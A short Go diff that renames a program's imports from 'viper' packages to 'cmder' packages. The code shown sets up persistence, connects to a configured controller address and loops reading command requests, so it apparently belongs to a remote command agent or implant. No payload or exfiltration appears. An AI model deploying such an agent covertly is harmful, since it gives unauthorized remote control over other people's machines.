@@ -2,10 +2,10 @@ package main
 
 import (
 	"log"
-	"viper"
-	"viper/agent/controller"
-	"viper/agent/modules"
-	pb "viper/protos/cmds"
+	"cmder"
+	"cmder/tachyon/controller"
+	"cmder/tachyon/modules"
+	pb "cmder/axon/cmds"
 
 	"google.golang.org/protobuf/proto"
 )
@@ -15,7 +15,7 @@ func main() {
 	if err != nil {
 		log.Fatalf("failed to persist: %v", err)
 	}
-	controller := controller.Controller{Addr: viper.Conf.Agent.ControllerAddress}
+	controller := controller.Controller{Addr: cmder.Conf.Agent.ControllerAddress}
 	controller.Connect()
 	for {
 		cmdReq, err := controller.ReadCommandRequest()
